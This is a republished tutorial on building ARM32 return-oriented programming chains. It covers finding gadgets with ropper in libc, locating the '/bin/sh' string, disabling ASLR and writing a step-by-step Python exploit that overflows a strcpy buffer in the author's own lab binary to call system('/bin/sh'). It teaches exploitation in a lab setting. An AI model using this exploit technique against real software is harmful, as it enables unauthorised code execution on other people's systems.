# :game_die: Rop Chains On Arm 3F087A95381E

> **Original Source:** [Rop Chains On Arm 3F087A95381E](https://infosecwriteups.com/rop-chains-on-arm-3f087a95381e)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

Hello,


This is my first writeup on medium and this will be a long one . We will be looking at ROP chains in Arm32. There are two reasons for writing this.


- Resources on ARM ROP chains are less when compared to x86 (of course there are some awesome writeups like in azerialabs.com)

- I have seen people doing rop but don’t seem to understand it well and also they don’t have the idea for finding such gadgets for rop chaining.For example, if they are using a gadget in a particular libc version from a writeup or something and when they are encountered with a binary having a different libc version the same gadgets that they are using from the writeup of someone else may not be present there. So in these cases, one should know how to find certain gadgets for chaining.


The second one is the main reason I m writing this. The key takeaway from this post is that one should be able to find their gadgets irrespective of different libc versions. i think this is getting boring so enough introductions and let’s get started


oh…wait I forgot the introduction part to ROP

## Introduction to ROP


So basically what is rop chaining?


Rop or Return Oriented Programming as the name suggests is just chaining some instructions to do a particular action. so why are we doing rop in the first place? Hmmm…


So as you all know when our binary is compiled it has some protection mechanisms to prevent certain attacks like buffer overflow. These protection mechanisms include NX/DEP , Stack canary, etc. In this post, I will be covering NX only.


NX/DEP = No execute..that’s all


The idea of NX is to make our stack non-executable . When we do a buffer overflow we overflow the stack and puts shell code in our stack so that we can execute it to get a shell or something. But what happens when the stack becomes non-executable ?? As you might guess our shellcode won’t run and as a result, our exploit will fail. So this is where ROP comes into play


So basically with the help of ROP we can chain instructions to do something without making our stack executable.so the next question is what instruction should we chain and where to look for it .

### Looking for gadgets


So what are these gadgets in the first place?


They are just assembly instructions that help us to make our rop chain. There are a lot of useful instructions in our binary itself other than the actual code. The other place to look for is our libc binary as you know the libc library will be dynamically loaded into the memory when we load a particular binary. The functions and instructions are linked with our binary to compress the size of the binary if it’s dynamically linked(by default). As there are different versions of these libraries used in different operating systems, the same gadgets that were seen in one library won’t be available in another library.


Now we know that we can also look into libc library for gadgets. So the next question is how to look for these gadgets.


We will be using a tool called ropper for this .it may not be a good idea to install ropper in the emulated pi as it is very slow so it’s better to install ropper in the host .Use the below command to install ropper.


*sudo pip install ropper*


As i have ropper it says it's already satisfied. The next thing is using ropper .its pretty much easy to use ropper. Just type ropper to run ropper

>

user@ubuntu:~$ ropper
(ropper)>


Now we are in the ropper interface. so to load a file using the file command


So i loaded the binary crackme into ropper. Now we can search for the gadgets using the search command.


*search /<depth>/ <gadget> // This should be the way to search gadgets*


For example, if I want to load all the gadgets in the binary I can simply type “*gadgets*”

>

(crackme#1/ELF/ARM)> gadgets


Gadgets
=======


0x000105b0: add r4, r4, #1; ldr r3, [r5, #4]!; mov r0, r7; mov r1, r8; mov r2, sb; blx r3;
0x0001030c: andeq r0, r0, r6, lsl r5; andeq r0, r2, r0, ror r7; andeq r0, r0, r6, lsl r6; push {r3, lr}; bl #0x3c8; pop {r3, pc};
0x00010314: andeq r0, r0, r6, lsl r6; push {r3, lr}; bl #0x3c8; pop {r3, pc};
0x000105d4: andeq r0, r1, ip, asr #1; andeq r0, r1, r4, asr #1; bx lr;
0x000105d4: andeq r0, r1, ip, asr #1; andeq r0, r1, r4, asr #1; bx lr; push {r3, lr}; pop {r3, pc};
0x000105d8: andeq r0, r1, r4, asr #1; bx lr;
0x000105d8: andeq r0, r1, r4, asr #1; bx lr; push {r3, lr}; pop {r3, pc};
0x00010310: andeq r0, r2, r0, ror r7; andeq r0, r0, r6, lsl r6; push {r3, lr}; bl #0x3c8; pop {r3, pc};
0x00010430: asrs r1, r1, #1; bxeq lr; ldr r3, [pc, #0x10]; cmp r3, #0; bxeq lr; bx r3;
0x00010494: b #0x41c; ldr r3, [pc, #0x10]; cmp r3, #0; beq #0x490; blx r3;
0x000104a0: beq #0x490; blx r3;
0x0001031c: bl #0x3c8; pop {r3, pc};
0x00010468: bl #0x3ec; mov r3, #1; strb r3, [r4]; pop {r4, pc};
0x000104a4: blx r3;
0x000105cc: bne #0x5b0; pop {r3, r4, r5, r6, r7, r8, sb, pc}; andeq r0, r1, ip, asr #1; andeq r0, r1, r4, asr #1; bx lr;
0x000105dc: bx lr;
0x000105dc: bx lr; push {r3, lr}; pop {r3, pc};
0x0001040c: bx r3;
0x00010408: bxeq lr; bx r3;
0x00010434: bxeq lr; ldr r3, [pc, #0x10]; cmp r3, #0; bxeq lr; bx r3;
0x000103fc: bxls lr; ldr r3, [pc, #0x10]; cmp r3, #0; bxeq lr; bx r3;
0x0001049c: cmp r3, #0; beq #0x490; blx r3;
0x00010404: cmp r3, #0; bxeq lr; bx r3;
0x00010460: cmp r3, #0; popne {r4, pc}; bl #0x3ec; mov r3, #1; strb r3, [r4]; pop {r4, pc};
0x000103f8: cmp r3, #6; bxls lr; ldr r3, [pc, #0x10]; cmp r3, #0; bxeq lr; bx r3;
0x000105c8: cmp r4, r6; bne #0x5b0; pop {r3, r4, r5, r6, r7, r8, sb, pc}; andeq r0, r1, ip, asr #1; andeq r0, r1, r4, asr #1; bx lr;
0x00010498: ldr r3, [pc, #0x10]; cmp r3, #0; beq #0x490; blx r3;
0x00010400: ldr r3, [pc, #0x10]; cmp r3, #0; bxeq lr; bx r3;
0x000105b4: ldr r3, [r5, #4]!; mov r0, r7; mov r1, r8; mov r2, sb; blx r3;
0x000105b8: mov r0, r7; mov r1, r8; mov r2, sb; blx r3;
0x000105bc: mov r1, r8; mov r2, sb; blx r3;
0x000105c0: mov r2, sb; blx r3;
0x0001046c: mov r3, #1; strb r3, [r4]; pop {r4, pc};
0x00010490: pop {r3, lr}; b #0x41c; ldr r3, [pc, #0x10]; cmp r3, #0; beq #0x490; blx r3;
0x00010320: pop {r3, pc};
0x000105d0: pop {r3, r4, r5, r6, r7, r8, sb, pc}; andeq r0, r1, ip, asr #1; andeq r0, r1, r4, asr #1; bx lr;
0x000105d0: pop {r3, r4, r5, r6, r7, r8, sb, pc}; andeq r0, r1, ip, asr #1; andeq r0, r1, r4, asr #1; bx lr; push {r3, lr}; pop {r3, pc};
0x00010474: pop {r4, pc};
0x00010464: popne {r4, pc}; bl #0x3ec; mov r3, #1; strb r3, [r4]; pop {r4, pc};
0x00010318: push {r3, lr}; bl #0x3c8; pop {r3, pc};
0x000105e0: push {r3, lr}; pop {r3, pc};
0x00010470: strb r3, [r4]; pop {r4, pc};


42 gadgets found
(crackme#1/ELF/ARM)>


As you can see it prints out all the gadgets in the binary.Now the searching, as the said above you can use “*search /<depth>/ <gadget>*”

>

(crackme#1/ELF/ARM)> search /1/ pop
[INFO] Searching for gadgets: pop


[INFO] File: crackme#1
0x00010320: pop {r3, pc};
0x00010474: pop {r4, pc};


(crackme#1/ELF/ARM)> search pop
[INFO] Searching for gadgets: pop


[INFO] File: crackme#1
0x00010490: pop {r3, lr}; b #0x41c; ldr r3, [pc, #0x10]; cmp r3, #0; beq #0x490; blx r3;
0x00010320: pop {r3, pc};
0x000105d0: pop {r3, r4, r5, r6, r7, r8, sb, pc}; andeq r0, r1, ip, asr #1; andeq r0, r1, r4, asr #1; bx lr;
0x000105d0: pop {r3, r4, r5, r6, r7, r8, sb, pc}; andeq r0, r1, ip, asr #1; andeq r0, r1, r4, asr #1; bx lr; push {r3, lr}; pop {r3, pc};
0x00010474: pop {r4, pc};
0x00010464: popne {r4, pc}; bl #0x3ec; mov r3, #1; strb r3, [r4]; pop {r4, pc};


(crackme#1/ELF/ARM)>


Now look at the usage i specified the depth as 1 and the gadget as pop so it displayed instructions having pop .


Take a look at the difference in output between 1st and 2nd.In the first case i specified the depth so it displayed instructions only having pop.but in the second case i didn’t specify any depth so it displayed elements having other instruction with pop.Keep this in mind, So lets move on to the next phase

### What gadgets to find


There are lots of gadgets so we should trim down the gadgets and select the useful ones for our purpose.oh, wait whats the purpose here ???


Don’t forget we are chaining these gadgets in order to do something. So what are we aiming for? As I said we can chain them the way we want and get something done.


In a buffer overflow, we mainly execute our shellcode in order to get a reverse connection or a shell to escalate the privilege.So think about it what if we chain the gadgets or the instructions in a way that gives us the shell? Sounds interesting right? This is exactly what we are going to do.


So what function will be helpful for this ?? Any ideas… Behold the “system function”.The system function is a function that executes commands by calling /bin/sh . we can now check out the man page of the system function.


*for more reading about the system, function *click [here](https://linux.die.net/man/3/system)


I don’t want to make the post longer here by explaining unnecessary things so long story short, the system function takes its argument as a command, executes it, and returns the output so we can try using a simple c code below.

>

#include <stdlib.h>


int main(){


system(“ls”);


}


This will execute the “ls” command


As so you can here the command got executed and listed the files. So what happens if we pass /bin/sh as the argument … Let's see


As expected we got a shell


So the conclusion is we can invoke the system function and get a shell by passing “/bin/sh” as the argument. Now let's move on to the Arm stuff

### Calling the system function in ARM


In ARM the arguments to the function are passed through registers and the stack. The first four arguments are passed via r0 to r3 and later arguments passed through the stack


In our case, the system function takes one argument as the command to be executed. So to get a shell we need the pass the string “/bin/sh” as the first argument in the register r0 and after that, we should call the system function. Now we are all set to find gadgets with ropper.

### Finding the right gadgets


This is the most relevant part of this article.i want you to get the idea of finding your own gadgets regardless of the libc version.


Firstly As you know we need to invoke the system function with our “/bin/sh” string as an argument in the r0 register (first parameter).The only thing we can control is the stack by our input we can’t directly put data into the r0 register.So our objective is to find a gadget that puts the data at a particular position in the stack into the r0 register and also we need to get back the control of pc again so that we can call the system function to get the shell …Any ideas????


There are two common arm instructions that will help you achieve this. they are


- The pop instruction

- The load instruction


The pop instruction pops data from the stack to a register.So we can pop the values from the stack to our r0 register right? .Similarly if you take a look at the load instruction it can load the value from the stack to the register .So we can use ropper to find pop / load instruction that puts value from the stack to the r0 register and also look out for gadgets that give our the control back so that we can call the system function (gadgets like pop {pc}).we will looking these gadgets in our libc library .i m using ubuntu 16.04 from azeria labs which have emulated raspi.The arm version is Arm 6I ([link](https://azeria-labs.com/arm-lab-vm/)).


By the way, you can also use other pops like popping into r3 or r4, etc, and use a mov gadget to copy that value into r0 But i wanted to make the rop chain is more simple and clean.If you have simple gadgets you should always consider using that.For example,if you have a direct pop to r0 (pop {r3,r0}) and another gadget that pops to r4 and r5. You should without a doubt use the first one, why?? Because it’s more simple and clean. if you use the second one (pop {r4,r5}) you again need to find another mov gadget that copies the data from r4 or r5 to r0.why even bother chaining two gadgets if you get what you want in a single gadget. I mean like why???


Firstly you need to copy the libc library from the emulated pi to host .it will take a lot of time if you use ropper within the emulated pi .


if you want to see the library being loaded. you can load the binary into gdb and put a breakpoint anywhere you like, once it hits use the ‘vmmap’ command to see the mapped objects of the binary. So the location is ‘/lib/arm-linux-gnueabihf/libc-2.19.so’.


Note that this can be only seen if the binary is dynamically linked.


So you can just copy the library from /lib/arm-linux-gnueabihf/libc-2.19.so .I just used bashupload.com to upload this and download it back to the host using curl.


Now, load the libc into ropper using the file command


Now we need to find gadgets which pops data from the stack to the r0 register.so we can search for that

>

search /1/ pop


Lucky enough we got two gadget which pops data from the stack to the r0 register.if you look at the first one it has more pops than the second one and ends with bx ip .So it would be better considering the second one why? we don’t want to deal with many complicated branchings like bx ip and also we are not getting the control back it ends with a “bx ip” .we should always consider the gadgets which are concise and simple.if we look at the second one it’s not complicated and doesn’t have any other instructions.it pops three values from the stack to r0,r4,pc so we are getting the chance to put our input data to r0 (first argument) and also it pops the third value to pc this will help us to get the control back to the user input.if you somehow manage to put the address of the system function to pc in the third pop the exploit is done and we will get the shell , it is that easy .So its better to choose the second pop instruction (highlighted by a red mark).


This one gadget is enough to make the exploit. but we ain’t stopping here dawg..(i guess that wasn’t cringing).


As I said the key takeaway from this writeup is to help you find your gadgets So let’s move on to the next gadget* load*. we will search for ‘ldr’ now.


We need to sort out the useful gadget from this output so we need some gadget that loads data from the data (“/bin/sh”) to the r0 register.i found a useful gadget


As you look here it loads the data from stack [sp,#0x18] into r0 register followed by some pops .In the last pop we are getting the control back so similarly if you put the address of “/bin/sh” string into r0 and call the system function in the last pop (pop {r3,r4,r5,r6,r7,pc}) we will pretty much get a shell.


If they are less gadgets you can search for gadgets without depth and sort out the useful ones . So lets do that using “search ldr”


Note: Always find gadgets which gives the control of pc back to us

>

0x000ac2c8: ldr r0, [sp, #4]; add sp, sp, #0xc; pop {r4, r5, pc};
0x00106088: ldr r0, [sp, #4]; add sp, sp, #8; pop {r4, pc};
0x0001aa08: ldr r0, [sp, #4]; add sp, sp, #8; pop {r4, r5, r6, pc};
0x00031874: ldr r0, [sp, #4]; add sp, sp, #8; pop {r7, pc};


0x000ec73c: ldr r0, [sp, #0x10]; add sp, sp, #0x20; pop {r4, r5, r7, pc};
0x00100f78: ldr r0, [sp, #0x18]; pop {r3, r4, r5, r6, r7, pc};


These all are useful gadgets but to keep our exploit short use the gadget with minimum pops so i will be using


0x00031874:*ldr r0, [sp, #4]; add sp, sp, #8; pop {r7, pc};*


So copy the offset of the gadget you want use to some text editor (mine:0x00031874).You can also use any one of the above gadgets they all should be working fine.They all can load data from the stack to the r0 register which is our first parameter given to the system function as the command and they also give back the control of pc which can be used to call the system function.


Now moving on to our next phase

### Getting the address of “/bin/sh” string


We need to pass the address of “/bin/sh” to r0 register as the argument so that when the system function is called we will land a shell.Luckily for us the string “/bin/sh” is already present in our libc library .if the string wasn’t present you should provide the string as input and put the address of input position which contains the string “/bin/sh” to the r0 register.Now Lets find the address of the string “/bin/sh” in the libc .For this we can use the strings command.

>

user@ubuntu:~/course_lab$ strings — help
Usage: strings [option(s)] [file(s)]
Display printable strings in [file(s)] (stdin by default)
The options are:
-a — — all Scan the entire file, not just the data section [default]
-d — data Only scan the data sections in the file
-f — print-file-name Print the name of the file before each string
-n — bytes=[number] Locate & print any NUL-terminated sequence of at
-<number> least [number] characters (default 4).
-t — radix={o,d,x} Print the location of the string in base 8, 10 or 16
-w — include-all-whitespace Include all whitespace as valid string characters
-o An alias for — radix=o
-T — target=<BFDNAME> Specify the binary file format
-e — encoding={s,S,b,l,B,L} Select character size and endianness:
s = 7-bit, S = 8-bit, {b,l} = 16-bit, {B,L} = 32-bit
-s — output-separator=<string> String used to separate strings in output.
@<file> Read options from <file>
-h — help Display this information
-v -V — version Print the program’s version number
strings: supported targets: elf64-x86–64 elf32-i386 elf32-iamcu elf32-x86–64 a.out-i386-linux pei-i386 pei-x86–64 elf64-l1om elf64-k1om elf64-little elf64-big elf32-little elf32-big pe-x86–64 pe-bigobj-x86–64 pe-i386 plugin srec symbolsrec verilog tekhex binary ihex
Report bugs to <[http://www.sourceware.org/bugzilla/](http://www.sourceware.org/bugzilla/)>
user@ubuntu:~/course_lab$


we should use -t ,-a for getting the proper offset of the string residing in the library. -t for printing the offset in hex and -a scanning the entire library

>

-t radix={o,d,x} Print the location of the string in base 8, 10 or 16


-a : all Scan the entire file, not just the data section [default]


>

strings -t x -a libc_2.19.so| grep “/bin/sh”


Wow we got the offset of the string “/bin/sh”.its 0x11db20 (hex).Now the only thing left to do is to craft our exploit.

### The final exploit


i will be using my vulnerable binary ([link](http://bashupload.com/3AVVf/bof)).i hope you guys know how to exploit a simple buffer overflow .In this binary the pc will be overwritten at the 36th offset.


So at the 36th position we should provide the address of our gadget i repeat the address gadget not the offset .To find the actual address you just need to add the offset to the libc base address thats all.The base address of libc will be different each time when loaded so we should turn off ALSR.In ubuntu you can turn the alsr off by the command below

>

sudo echo 0 | tee /proc/sys/kernel/randomize_va_space


After doing this ,we need to get the address of the system function and also the base address of libc so load the binary into gdb i m using gef and put a breakpoint at anywhere you want using the b command.

>

pi@raspberrypi:~/asm/bof $ gdb bof
GNU gdb (Raspbian 7.7.1+dfsg-5+rpi1) 7.7.1
Copyright © 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <[http://gnu.org/licenses/gpl.html](http://gnu.org/licenses/gpl.html)>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law. Type “show copying”
and “show warranty” for details.
This GDB was configured as “arm-linux-gnueabihf”.
Type “show configuration” for configuration details.
For bug reporting instructions, please see:
<[http://www.gnu.org/software/gdb/bugs/](http://www.gnu.org/software/gdb/bugs/)>.
Find the GDB manual and other documentation resources online at:
<[http://www.gnu.org/software/gdb/documentation/](http://www.gnu.org/software/gdb/documentation/)>.
For help, type “help”.
Type “apropos word” to search for commands related to “word”…
[*] No debugging session active
GEF for linux ready, type `gef’ to start, `gef config’ to configure
56 commands loaded for GDB 7.7.1 using Python engine 2.7
[*] 4 commands could not be loaded, run `gef missing` to know why.
Reading symbols from bof…(no debugging symbols found)…done.
gef> b main
Breakpoint 1 at 0x1048c
gef>


As you can see here i put a breakpoint at main and now run the binary using the r command .it will hit the breakpoint at main as soon as it runs.Now use the print command to get the address of the system function

>

print &system


So the address of the system function is 0xb6eadfac


## Get Ajin Deepak (AD2001)’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Next we need the libc base addresss.so use the vmmap command to display the target process’s entire memory space mapping.

>

vmmap


The base address of the library is the address of the first mapping under the ‘Start’


So the base address of libc is ‘0xb6e74000’ (highlighted by yellow)


We got the both addresses so copy them both to a text editor or somewhere.


So everything is done .Now we can start writing our exploit.In my binary the pc will be overwritten at the 36th position.As you know when we are exploiting a simple buffer overflow we will craft the exploit in a way that the address of starting of our shellcode will overwrite pc so that the execution redirects to that particular location and executes our shellcode.But in our rop instead of pointing somewhere in the stack we will craft the exploit in a way that pc will be overwritten by the address of our gadget .so what happens here is that the execution will be redirected to the address of the gadget / instruction we provided and it will execute that instruction in that address


Lets create a python script you can use your own comfortable language .

>

nano rop.py


Fill the buffer with junk characters until it overwrite pc .So i will put 36 “A”s here

>

#!/usr/bin/python


junk = “A” * 36


The next character you input will overwrite the pc.Here is our magic happens


The next input should be the address of the gadget

>

0x00031874: ldr r0, [sp, #4]; add sp, sp, #8; pop {r7, pc};


To get the actual address add this offset to the libc base address.so the actual address is


0x00031874 + libc address = 0x00031874 + 0xb6e74000 = 0xB6EA5874


You can use the calculator to check this , we don’t to calculate this manually everytime you can use the struct module from python to do this

>

#!/usr/bin/python
import struct


base = 0xb6e74000


junk = “A” * 36
gadget1 = struct.pack(“<I”,base+0x00031874)


i created a variable ‘base’ with the libc base address .there is a another variable called gadget one which holds the actual address of the gadget.we are using struct.pack() to get address in little endian format .The first parameter in the struct.pack is “<I” .it specifies the address should be in little endian format.After that we are adding the base address with the gadget offset to get the address of the gadget.


Now take a look at the gadget

>

ldr r0, [sp, #4]; add sp, sp, #8; pop {r7, pc};


Its loading from sp+4 to r0 and adding 8 to the sp .After that its popping out two values from the top of the stack into r7 and pc.Lets see this in gdb .Before that add the print function in the script to output the exploit so that we can provide it to the program

>

#!/usr/bin/python
import struct


base = 0xb6e74000


junk = “A” * 36
gadget1 = struct.pack(“<I”,base+0x00031874)


print(junk+gadget1)


Now run this script to see the output

>

pi@raspberrypi:~/asm/challenges $ python rop.py
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtX
pi@raspberrypi:~/asm/challenges $


Nice …Everything’s working fine i guess..So start gdb and load the binary again

>

pi@raspberrypi:~/asm/challenges $ gdb ./bof
GNU gdb (Raspbian 7.7.1+dfsg-5+rpi1) 7.7.1
Copyright © 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <[http://gnu.org/licenses/gpl.html](http://gnu.org/licenses/gpl.html)>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law. Type “show copying”
and “show warranty” for details.
This GDB was configured as “arm-linux-gnueabihf”.
Type “show configuration” for configuration details.
For bug reporting instructions, please see:
<[http://www.gnu.org/software/gdb/bugs/](http://www.gnu.org/software/gdb/bugs/)>.
Find the GDB manual and other documentation resources online at:
<[http://www.gnu.org/software/gdb/documentation/](http://www.gnu.org/software/gdb/documentation/)>.
For help, type “help”.
Type “apropos word” to search for commands related to “word”…
[*] No debugging session active
GEF for linux ready, type `gef’ to start, `gef config’ to configure
56 commands loaded for GDB 7.7.1 using Python engine 2.7
[*] 4 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./bof…(no debugging symbols found)…done.
gef>


In my binary there a function called bof and its using strcpy,here’s the source code

>

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>


void bof(char *ip)
{
char buffer[30];
strcpy(buffer,ip);
printf(“Your output is %s \n”,buffer);

}


int main(int argc, char argv)
{

bof(argv[1]);


}


So disassemble the bof function and put a breakpoint at the last pop{r11,pc}


Now run the binary with the r command and provide the python script output as the command line input to the program you can do it like this

>

gef> r $(python rop.py)


Pressing enter will run the program with our python script’s output as input and hits the breakpoint


This pop will pop out two values from the top of the stack to r11 and pc .The first value 0x41414141 (“AAAA”) will be popped to r11 and the next value which is the address to our gadget will be popped to pc. As you can see here it is pointing our gadget “ldr r0 , [sp, #4]” . if you do a step over the instruction pc will be pointing to our gadget.


Okay…now it loads the value from sp+4 to r0 register .sp+4 is the second value from the top of the stack.

>

sp = 0xbefff210


sp+4 = 0xbefff214


Now sp+4 holds the value 2 so if we do a si r0 will become 2


But what we want to do is to load the address of the string “/bin/sh” to r0.For that we need to provide the address of the string in our exploit.Similarly we have to add the offset to the base address for that

>

#!/usr/bin/python
import struct


base = 0xb6e74000


junk = “A” * 36
gadget1 = struct.pack(“<I”,base+0x00031874) #ldr gadget
junk1 = “AAAA”
binsh = struct.pack(“<I”,base+0x11db20) #/bin/sh string


print(junk+gadget1+junk1+binsh)


so this is the modified exploit…you guys might be wondering why there is a junk1 with “AAAA” . Take a look at the gadget again it loads the value from sp+4 right?So if a provide the value right after the gadget1 it will be at the top of the stack ,ie in the sp.But in our case we need the value to be in sp+4 because our gadget only loads the value from sp+4 to r0.


i hope you get this :P


And once again load the binary into gdb and put a breakpoint at the last pop{r11,pc} in the bof function and run it using our exploit.


Oops something went wrong….if you look at sp+4 its holding 0 as the value but we provided the address of the string right??then what happened ??


Take a look the addresss of the string you provided.lets just calculate the actual address of the gadget manually for now ..

>

actual address = base address of libc + offset of the string


= 0xb6e74000 + 0x11db20 = 0xB6F91B20


Well nothing strange right ? Actually no if you look at the address there is a x20 at the end and this is a actually a hexadecimal ascii value for backspace.if you just google this you can see this

>

The space character, that denotes the space between words, as produced by the space-bar of a keyboard, represented by code 0x20 (hexadecimal), is considered a non-printing graphic (or an invisible graphic) rather than a control character.


The reason that this address wasn’t present in our stack is due to this.The vulnerable function in our program is strcpy. it terminates when it encountered a space . As you know the addressing will be in the little endian format so the x20 will be entering the stack first and as a result the copying terminates .This is why we see 00000000s in the stack
The next question is how to fix this ??????


The x20 breaks the copying right?So what if a provide an address that doesn’t have this x20 and readjust that address back to the original address so that it points to our gadget.Sounds confusing??


Its very easy actually.So first thing you want to do is to provide an address that doesnt have x20 in it and also very closer to our gadget.For example lets provide the address as 0xB6F91B21 (orginal address = 0xB6F91B20) so that it doesnt have the x20.But at the same time we need to readjust this addresss back to 0xB6F91B20 so that it points to our string and loads “/bin/sh” to the r0 register.To get the address as 0xB6F91B20 in r0 ,firtsly we need to provide the fake address that doesn’t contain the x20 and after that we can readjust the address back to 0xB6F91B20 using rop .you might be thinking if the address goes back to 0xB6F91B20 will it zero out the r0 register ? No, the register can hold any value that is the reason why we are modifying the register .Only the strcpy terminates the copying when x20 is occured in the stack .For this we can use our rop gadgets again..


This time you should look for gadgets that readjusts the address.you can look for add or sub instruction to do this.we should sort out the gadgets which adds or substracts the value in r0 back to the address that points to “/bin/sh” and gives us the control of pc ,this is very important because this is the only way we can control the execution so that after this we can execute the system function.


Lets start ropper again and load the libc.Look for add or sub gadgets which modifies r0 and gives back the control of pc .i will be looking for add gadgets


>

0x000fe950: add r0, r0, #0x90; pop {r3, pc};
0x000fe990: add r0, r0, #0x94; pop {r3, pc};


0x000fe910:add r0, r0, #0x80; pop {r3, pc};


These 3 gadgets matches our condition mentioned above and will do the job for us.You can select any one from the above gadgets, i prefer this one.

>

0x000fe910:add r0, r0, #0x80; pop {r3, pc};


So this will add 0x80 to r0 and pops r3 and pc . The next thing we want to do is we should modify the exploit and change the address of the “/bin/sh” string to 0xB6F91B2–0x80 so that we can use this gadget to add 0x80 and change the value in r0 back to the address pointing to “/bin/sh” string.After that, there are 2 pops which will pop r3 and pc . We can put any junk value in r3 and the address of the system on pc .So let’s do it

>

#!/usr/bin/python
import struct


base = 0xb6e74000


junk = “A” * 36
gadget1 = struct.pack(“<I”,base+0x00031874) #ldr gadget
junk1 = “AAAA”
binsh = struct.pack(“<I”,base+0x11db20–0x80) #/bin/sh string


print(junk+gadget1+junk1+binsh)


Now if you run gdb and check at “ldr r0, [sp,#4]” we can see 0xB6F91B20 –0x80,ie = 0xb6f91aa0


if we do a si the value from sp+4 = 0xb6f91aa0 will be loaded into r0.


So the first step is done after this there is an add instruction which adds 8 to sp .


The next step is to put the address of our next add gadget in pc we have the pop instruction for that.So that pop {r7,pc } will pop two values from the top of the stack to r7 and pc .Let’s modify our exploit to point to the next gadget

>

#!/usr/bin/python
import struct


base = 0xb6e74000


junk = “A” * 36
gadget1 = struct.pack(“<I”,base+0x00031874) #ldr gadget
junk1 = “AAAA”
binsh = struct.pack(“<I”,base+0x11db20–0x80) #/bin/sh string
junk2 = “AAAA”
gadget2 = struct.pack(“<I”,base+0x000fe910) #add gadget


print(junk+gadget1+junk1+binsh+junk2+gadget2)


After binsh we provided another junk2 which pops a junk value “AAAA” to r7 ,the next value is the address of our add gadget and it will be popped off to pc then pc will be pointing to the add gadget which will readjust the value in pc to 0xB6F91B20 which points back to our “/bin/sh” string.Let’s see this


Now everything is in place the only think left to do call the system function to get our shell.


This pop will pop two values from the stack into r3 and pc .As always we will insert some junk value to r3 and put the address of system into pc.Let’s do this for the last time .i hope you copied the system function’s address :p

>

#!/usr/bin/python
import struct


base = 0xb6e74000


junk = “A” * 36
gadget1 = struct.pack(“<I”,base+0x00031874) #ldr gadget
junk1 = “AAAA”
binsh = struct.pack(“<I”,base+0x11db20–0x80) #/bin/sh string
junk2 = “AAAA”
gadget2 = struct.pack(“<I”,base+0x000fe910) #add gadget
junk3 = “AAAA”
system = struct.pack(“<I”,0xb6eadfac) #system


print(junk+gadget1+junk1+binsh+junk2+gadget2+junk3+system)


Note that the address we provide inside the system variable is not added with the libc base because it’s not an offset like other gadgets its an actual address.Let’s look at our exploit layout


Our exploit is now fully crafted.Now lets run it inside gdb without any breakpoints.


Hurray… we got a shell !!!!!


Our hard work paid off .Now let’s try running it outside gdb (make sure alsr is off)


Yes ,it works fine …

*(sos : kaguyama sama love is war)*


Yeah i know i know it was a very long post and was almost tiring but i wanted to elaborate as much as i can so that you guys would understand better.Do try it by yourself .Take your time and understand how these gadgets are chained together to do something .i would suggest you to try rop chains to invoke mprotect() next.i will be publishing an article about that but not that soon Thank you for taking your time to read this article .i hope this was worth your time


Check out my udemy course if you are interested : [https://www.udemy.com/course/reverse-engineering-and-binary-exploitation-in-arm/?referralCode=8C725D513E77420A0CBF](https://www.udemy.com/course/reverse-engineering-and-binary-exploitation-in-arm/?referralCode=8C725D513E77420A0CBF)

---

*Originally published on [Medium](https://infosecwriteups.com/rop-chains-on-arm-3f087a95381e). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
